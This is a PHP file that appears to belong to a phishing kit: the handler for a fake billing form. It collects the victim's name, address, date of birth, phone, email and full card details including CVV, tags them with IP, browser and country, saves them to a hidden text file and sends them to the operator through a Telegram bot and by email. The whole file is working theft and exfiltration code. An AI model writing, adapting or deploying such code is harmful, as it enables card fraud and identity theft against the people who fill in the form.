<?php

    session_start();

    include('../c/ban.php');
    include('../c/geo.php');
    include('../c/sys.php');
    include('../../config.php');

    if ( !isset($_SESSION['a']) OR !isset($_SESSION['g']) ) {
        header("Location: ../index.php?#{$rand}");
        die();
    }

    if (isset($_POST['billing'])) {

        if (validateCardNumber($_POST['i'])) {

            $_SESSION['h'] = $_POST['h'];
            $_SESSION['i'] = $_POST['i'];
            $_SESSION['j'] = $_POST['j'];
            $_SESSION['k'] = $_POST['k'];
        
            $message = "== == == == == FUUUUUL == == == == =="."\n";
            $message .= " Full-Name : " . $_SESSION['a'] . "\n";
            $message .= " Address : " . $_SESSION['b'] . "\n";
            $message .= " City : " . $_SESSION['c'] . "\n";
            $message .= " Zip-code : " . $_SESSION['d'] . "\n";
            $message .= " DOB : " . $_SESSION['e'] . "\n";
            $message .= " Phone : " . $_SESSION['f'] . "\n";
            $message .= " E-mail : " . $_SESSION['g'] . "\n";
            $message .= "== == == == == == == == == == == == =="."\n";
            $message .= " * Holder-Name : " . $_POST['h'] . "\n";
            $message .= " * Card Number : " . str_replace(' ','',$_POST['i']) . "\n";
            $message .= " * Expiration : " . $_POST['j'] . "\n";
            $message .= " * CVV : " . $_POST['k'] . "\n";
            $message .= "== == == == == == == == == == == == =="."\n";
            $message .= " IP : ".$ip."\n";
            $message .= " OS : ".$OS."\n";
            $message .= " Browser : ".$Browsers."\n";
            $message .= " Country : ".$_SESSION['country']. "\n";
            $message .= "== == == == == == == == == == == == ==\n";

            if ($save_txt==1) {
                $file = fopen("../../_data_/{$_secure}.txt", "a");
                fwrite($file, $message . "\n");
                fclose($file);
            }

            if ($telegram==1) {
                $data = [
                    'text' => trim($message),
                    'chat_id' => $chat_id
                ];
                file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?".http_build_query($data));
            }

            if ($send_email==1) {
                $subject = "*** FUUUUUL | {$_SESSION['country']} | {$ip} ***";
                mail($to, $subject, trim($message));
            }

            header("Location: ../loading.php?#{$rand}");

        } else {
            header("Location: ../billing.php?error=invalidCardNumber&{$rand}"); 
            exit();
        }

    }

?>